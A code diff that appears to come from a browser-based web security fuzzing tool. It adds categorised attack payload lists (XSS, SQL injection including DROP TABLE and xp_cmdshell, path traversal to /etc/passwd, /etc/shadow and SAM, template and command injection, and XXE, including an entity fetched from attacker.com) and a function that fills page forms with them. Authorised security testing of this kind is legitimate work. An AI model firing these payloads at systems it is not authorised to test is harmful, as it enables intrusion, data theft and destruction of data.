@@ -57,12 +57,145 @@ export const hexToRgb = (hex: string) => {
   };
 };
 
+export const fuzzPayloads = {
+  xss: [
+    '<script>alert(1)</script>',
+    '<img src=x onerror=alert(1)>',
+    '<svg onload=alert(1)>',
+    '"><script>alert(1)</script>',
+    "'-alert(1)-'",
+    '<body onload=alert(1)>',
+    '<iframe src="javascript:alert(1)">',
+    '<input onfocus=alert(1) autofocus>',
+    '<marquee onstart=alert(1)>',
+    '<details open ontoggle=alert(1)>',
+    '<video><source onerror=alert(1)>',
+    '<audio src=x onerror=alert(1)>',
+    '{{constructor.constructor("alert(1)")()}}',
+    '<a href="javascript:alert(1)">click</a>',
+    '<div onmouseover="alert(1)">hover</div>',
+    '<form><button formaction=javascript:alert(1)>X',
+    '"><img src=x onerror=alert(1)>',
+    "';alert(1)//",
+    '</script><script>alert(1)</script>',
+    '<object data="javascript:alert(1)">'
+  ],
+  sqli: [
+    `' OR '1'='1`,
+    `" OR "1"="1`,
+    `' OR '1'='1' --`,
+    `' OR '1'='1' /*`,
+    `admin' --`,
+    `1' ORDER BY 1--`,
+    `1' ORDER BY 10--`,
+    `1 UNION SELECT NULL--`,
+    `1 UNION SELECT NULL,NULL--`,
+    `' UNION SELECT username,password FROM users--`,
+    `1; DROP TABLE users--`,
+    `'; EXEC xp_cmdshell('dir')--`,
+    `' AND 1=1--`,
+    `' AND 1=2--`,
+    `' WAITFOR DELAY '0:0:5'--`,
+    `1' AND (SELECT SLEEP(5))--`,
+    `' OR SLEEP(5)#`,
+    `'; SELECT pg_sleep(5)--`,
+    `' || (SELECT version())--`,
+    `')) OR (('1'='1`
+  ],
+  lfi: [
+    '../../etc/passwd',
+    '../../../etc/passwd',
+    '....//....//etc/passwd',
+    '..%2f..%2f..%2fetc/passwd',
+    '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+    '/etc/passwd%00',
+    '....//....//....//etc/passwd',
+    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+    '/proc/self/environ',
+    '/var/log/apache2/access.log',
+    'php://filter/convert.base64-encode/resource=index.php',
+    'php://input',
+    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+',
+    'expect://id',
+    '/etc/shadow',
+    '/etc/hosts',
+    'C:\\Windows\\System32\\config\\SAM',
+    '..%252f..%252f..%252fetc/passwd',
+    '%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
+    'file:///etc/passwd'
+  ],
+  ssti: [
+    '{{7*7}}',
+    '${7*7}',
+    '<%= 7*7 %>',
+    '#{7*7}',
+    '*{7*7}',
+    '@(7*7)',
+    '{{config}}',
+    '{{self}}',
+    '${T(java.lang.Runtime).getRuntime().exec("id")}',
+    '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
+    '{{"".__class__.__mro__[2].__subclasses__()}}',
+    '${{7*7}}',
+    '{{constructor.constructor("return this")()}}',
+    '<%=`id`%>',
+    '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}',
+    '{php}echo `id`;{/php}',
+    '{{lipsum.__globals__.os.popen("id").read()}}',
+    '${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}',
+    '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
+    '[[${7*7}]]'
+  ],
+  cmd: [
+    '; id',
+    '| id',
+    '|| id',
+    '& id',
+    '&& id',
+    '`id`',
+    '$(id)',
+    '; ls -la',
+    '| cat /etc/passwd',
+    '; ping -c 3 127.0.0.1',
+    '| whoami',
+    '; uname -a',
+    '`whoami`',
+    '$(`whoami`)',
+    '; sleep 5',
+    '| sleep 5',
+    '%0aid',
+    "'; exec('id')",
+    "'; system('id')",
+    '\nid'
+  ],
+  xxe: [
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
+    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>',
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
+    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>',
+    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>',
+    '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///dev/random">]>',
+    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>'
+  ]
+};
+
+export type FuzzCategory = keyof typeof fuzzPayloads;
+
+export const fuzzCategories: { key: FuzzCategory; label: string; icon: string }[] = [
+  { key: 'xss', label: 'XSS', icon: '⚡' },
+  { key: 'sqli', label: 'SQLi', icon: '🗄' },
+  { key: 'lfi', label: 'LFI', icon: '📁' },
+  { key: 'ssti', label: 'SSTI', icon: '🔧' },
+  { key: 'cmd', label: 'CMD', icon: '💻' },
+  { key: 'xxe', label: 'XXE', icon: '📄' }
+];
+
 export const defaultPayloads = [
-  `"' OR '1'='1`,
-  '<script>alert(1)</script>',
-  '../../etc/passwd',
-  '{{7*7}}',
-  '${7*7}'
+  ...fuzzPayloads.xss.slice(0, 1),
+  ...fuzzPayloads.sqli.slice(0, 1),
+  ...fuzzPayloads.lfi.slice(0, 1),
+  ...fuzzPayloads.ssti.slice(0, 2)
 ];
 
 export const parseHeadersInput = (value: string) =>
@@ -205,28 +338,93 @@ export const getFormsSnapshot = () =>
     };
   });
 
-export const applyPayloadToForm = (formIndex: number, payload: string) => {
+export type PayloadFieldResult = {
+  name: string;
+  type: string;
+  applied: boolean;
+  reason?: string;
+};
+
+export type PayloadApplicationResult = {
+  success: boolean;
+  formFound: boolean;
+  totalFields: number;
+  appliedCount: number;
+  skippedCount: number;
+  fields: PayloadFieldResult[];
+};
+
+export const applyPayloadToForm = (formIndex: number, payload: string): PayloadApplicationResult => {
   const form = document.querySelectorAll('form')[formIndex];
-  if (!form) return false;
+  if (!form) {
+    return {
+      success: false,
+      formFound: false,
+      totalFields: 0,
+      appliedCount: 0,
+      skippedCount: 0,
+      fields: []
+    };
+  }
+
   const fields = Array.from(
     form.querySelectorAll('input, textarea, select')
   ) as Array<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>;
+
+  const fieldResults: PayloadFieldResult[] = [];
+  let appliedCount = 0;
+  let skippedCount = 0;
+
   fields.forEach((field) => {
+    const name = field.name || field.id || `(unnamed ${field.tagName.toLowerCase()})`;
+    const type = field instanceof HTMLInputElement
+      ? field.type.toLowerCase()
+      : field.tagName.toLowerCase();
+
     if (field instanceof HTMLInputElement) {
-      const type = field.type.toLowerCase();
-      if (['checkbox', 'radio', 'submit', 'button', 'file'].includes(type)) {
+      const inputType = field.type.toLowerCase();
+      if (['checkbox', 'radio', 'submit', 'button', 'file', 'hidden'].includes(inputType)) {
+        fieldResults.push({
+          name,
+          type,
+          applied: false,
+          reason: `Skipped: ${inputType} field`
+        });
+        skippedCount++;
         return;
       }
     }
+
     if (field instanceof HTMLSelectElement) {
-      field.value = field.options[0]?.value ?? '';
+      // For select, we don't inject payload - just note it
+      fieldResults.push({
+        name,
+        type: 'select',
+        applied: false,
+        reason: 'Skipped: dropdown field'
+      });
+      skippedCount++;
     } else {
       field.value = payload;
+      field.dispatchEvent(new Event('input', { bubbles: true }));
+      field.dispatchEvent(new Event('change', { bubbles: true }));
+      fieldResults.push({
+        name,
+        type,
+        applied: true
+      });
+      appliedCount++;
     }
-    field.dispatchEvent(new Event('input', { bubbles: true }));
-    field.dispatchEvent(new Event('change', { bubbles: true }));
   });
-  return true;
+
+  return {
+    success: appliedCount > 0,
+    formFound: true,
+    totalFields: fields.length,
+    appliedCount,
+    skippedCount,
+    fields: fieldResults
+  };
 };
 
 export const PREVIEW_SCALE = 0.5;
